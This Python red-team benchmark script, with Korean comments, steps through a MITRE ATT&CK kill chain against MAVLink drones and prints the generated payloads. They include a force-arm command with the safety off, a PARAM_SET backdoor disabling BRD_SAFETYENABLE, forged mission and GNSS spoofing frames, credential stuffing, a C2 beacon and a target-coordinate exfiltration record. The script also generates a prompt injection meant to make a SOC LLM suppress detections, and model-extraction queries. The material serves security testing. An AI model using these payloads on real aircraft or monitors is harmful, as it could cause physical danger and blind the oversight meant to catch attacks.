#!/usr/bin/env python3
"""MITRE ATT&CK 전술 단계별 실제 페이로드 — end-to-end.

    python benchmarks/mitre_killchain_eval.py

각 ATT&CK 전술(정찰→…→임팩트)에서 에이전트가 실제로 생성하는 페이로드를 출력.
바이트 페이로드는 hex 프리뷰, 텍스트 페이로드는 원문. 결정론·무의존(Tier-0).
주: pymavlink 미설치 시 프레임 빌더는 태그된 결정론 표현 반환(설치 시 실 MAVLink v2).
"""
from __future__ import annotations

import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from redteam_core.rag.static_kb import COMMAND_SPEC                            # noqa: E402
from redteam_core.transport import (                                          # noqa: E402
    build_mavlink_gps_frame, build_mavlink_param_set_frame,
    build_mavlink_mission_item_frame,
)
from redteam_core.payloads import (                                           # noqa: E402
    AdaptivePayloadGenerator, SituationContext, generate_extraction_ladder,
)


def _bytes(b: bytes) -> str:
    return f"{len(b)}B · {b[:40].hex()}{'…' if len(b) > 40 else ''}"


def stage(tactic, tid, technique, payload_label, payload):
    print(f"\n[{tactic}] {tid} · {technique}")
    print(f"  ▶ 페이로드({payload_label}):")
    print(f"    {payload}")


def main():
    print("="*70)
    print(" MITRE ATT&CK 전술별 실제 페이로드 — fried-pollack-ai")
    print("="*70)

    # 1. 정찰
    stage("Reconnaissance", "T1595", "능동 스캔·MAVLink 정찰",
          "static_kb spec", json.dumps(COMMAND_SPEC["active_scan"], ensure_ascii=False))

    # 2. 초기 접근 — 자격증명 스터핑(auth-stub POST body)
    cred = {"username": "operator-01", "password": "Spring2026!", "attempt": 1}
    stage("Initial Access", "T1078/T1110", "유효계정·브루트포스",
          "auth-stub POST JSON", json.dumps(cred, ensure_ascii=False))

    # 3. 실행 — force_arm MAVLink COMMAND_LONG
    fa = COMMAND_SPEC["force_arm"]
    stage("Execution", fa["technique"], "MAVLink 명령 주입(force_arm)",
          "COMMAND_LONG", f"cmd={fa['cmd']}(ARM) params=[1(arm),0(safety off),0,0,0,0,0]")

    # 4. 지속 — PARAM_SET EEPROM 백도어 프레임(§L/§K)
    stage("Persistence", "T0864", "안전 파라미터 백도어(재부팅 생존)",
          "PARAM_SET frame", _bytes(build_mavlink_param_set_frame("BRD_SAFETYENABLE", 0.0)))

    # 5. 방어 회피 — 상황 맞춤 SOC 인젝션(§N)
    ctx = SituationContext(scenario="S90", target_rule="S1_GNSS_Spoofing")
    inj = AdaptivePayloadGenerator().generate(ctx)[0]
    stage("Defense Evasion", "AML.T0051", "SOC LLM 프롬프트 인젝션(탐지 억제)",
          "injection string", inj.text)
    print(f"    변형(homoglyph): {inj.variants[0][:60]}…")

    # 6. 측면 이동 — 위조 임무 업로드 프레임
    stage("Lateral Movement", "T1090", "C2 경유 위조 임무 주입",
          "MISSION_ITEM frame", _bytes(build_mavlink_mission_item_frame(0, 367100000, 1261300000, 80.0)))

    # 7. 수집 — 모델 추출 질의(§N)
    q = generate_extraction_ladder()[4]
    stage("Collection", "AML.T0057", "모델 추출·워치리스트 유출",
          "extraction query", q.query)

    # 8. 명령·제어 — C2 비콘(상용 포트 T0885)
    beacon = {"agent": "beacon-A", "status": "alive", "task_req": True}
    stage("Command & Control", "T0885", "상용 포트 은닉 C2 비콘",
          "TCP beacon JSON", json.dumps(beacon, ensure_ascii=False))

    # 9. 유출 — SAR 표적좌표 유출
    exfil = {"type": "sar_target", "lat": 36.712, "lon": 126.131, "dest": "203.0.113.66"}
    stage("Exfiltration", "T1020", "SAR 표적좌표 허가구역 외 유출",
          "exfil record", json.dumps(exfil, ensure_ascii=False))

    # 10. 임팩트 — GNSS 스푸핑 프레임(§C/§K)
    stage("Impact", "T0835/T1565", "GNSS 스푸핑(항법 조작)",
          "GPS_INPUT frame", _bytes(build_mavlink_gps_frame(lat_e7=367150000)))

    print(f"\n{'='*70}")
    print(" 정찰→초기접근→실행→지속→방어회피→측면이동→수집→C2→유출→임팩트")
    print(" 각 전술마다 실제 생성 페이로드(프레임 바이트·인젝션·질의·비콘)를 산출.")
    print("="*70)


if __name__ == "__main__":
    main()
